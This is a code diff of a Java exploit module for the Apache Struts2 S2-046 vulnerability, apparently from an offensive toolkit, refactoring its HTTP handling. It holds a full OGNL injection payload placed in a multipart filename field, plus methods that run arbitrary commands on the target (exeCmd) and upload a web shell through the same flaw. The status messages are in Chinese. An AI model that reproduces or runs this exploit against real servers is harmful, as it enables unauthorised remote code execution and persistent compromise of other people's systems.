@@ -1,9 +1,12 @@
 package fun.fireline.exp.apache.struts2;
 
 import fun.fireline.core.ExploitInterface;
-import fun.fireline.tools.HttpTool;
+import fun.fireline.tools.HttpTools;
+import fun.fireline.tools.Response;
+import fun.fireline.tools.Tools;
 
 import java.net.URLEncoder;
+import java.util.HashMap;
 import java.util.UUID;
 
 /**
@@ -16,6 +19,7 @@ public class S2_046 implements ExploitInterface {
 
     private String target = null;
     private boolean isVul = false;
+    private HashMap<String, String> headers = new HashMap();
 
     private String check_payload = "------WebKitFormBoundaryJu2AMz9oOO1rTykn\r\n" +
             "Content-Disposition: form-data; name=\"test\"; filename=\"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('UUID')).(#res.getWriter().print('')).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath('/'))).(#res.getWriter().flush()).(#res.getWriter().close())}\u0000b\"\r\n" +
@@ -32,36 +36,35 @@ public class S2_046 implements ExploitInterface {
             "------WebKitFormBoundaryBxsps4jIWJ7XFGDD--\r\n";
     private String webPath;
 
+
     @Override
-    public boolean checkVul(String url) {
+    public String checkVul(String url) {
         this.target = url;
         String uuid =  UUID.randomUUID().toString();
-        try {
-            String data = this.check_payload.replace("UUID", uuid);
-            String result = HttpTool.postHttpReuest(this.target, "multipart/form-data; boundary=----WebKitFormBoundaryJu2AMz9oOO1rTykn", data, "UTF-8");
-            boolean flag = result.contains(uuid);
-            if(flag) {
-                this.isVul = true;
-                this.webPath = result.replace(uuid, "");
-            }
-            return flag;
-        } catch (Exception e) {
-            logger.error(e);
+
+        this.headers.put("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryJu2AMz9oOO1rTykn");
+        String data = this.check_payload.replace("UUID", uuid);
+        Response response = HttpTools.post(this.target, data, this.headers, "UTF-8");
+
+        if(response.getText() != null  && response.getText().contains(uuid)) {
+            this.isVul = true;
+            this.webPath = Tools.regReplace(response.getText().replace(uuid, ""));
+            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
+        } else if (response.getError() != null) {
+            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
+        } else {
+            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
         }
-        return false;
+
     }
 
     @Override
     public String exeCmd(String cmd, String encoding) {
-        try {
-            String data = payload.replace("payload", cmd);
-            String result = HttpTool.postHttpReuest(this.target, "multipart/form-data; boundary=----WebKitFormBoundaryBxsps4jIWJ7XFGDD", data, encoding);
-            return result;
 
-        } catch (Exception e) {
-            logger.error(e);
-        }
-        return "fail";
+        String data = this.payload.replace("payload", cmd);
+        this.headers.put("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryBxsps4jIWJ7XFGDD");
+        Response response = HttpTools.post(this.target, data, headers, encoding);
+        return response.getText();
     }
 
     @Override
@@ -83,7 +86,11 @@ public class S2_046 implements ExploitInterface {
 
         payload = payload.replace("SHELLPATH", filename).replace("SHELLContent", fileContent);
 
-        String result = HttpTool.postHttpReuest(this.target, "multipart/form-data; boundary=----WebKitFormBoundaryDpxd5NY6NhpFBen1", payload, "UTF-8");
+
+        this.headers.put("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryDpxd5NY6NhpFBen1");
+        Response response = HttpTools.post(this.target, payload, this.headers, "UTF-8");
+
+        String result = response.getText();
 
         if(result.contains("ok00koK")) {
             result = result + "  上传成功! ";
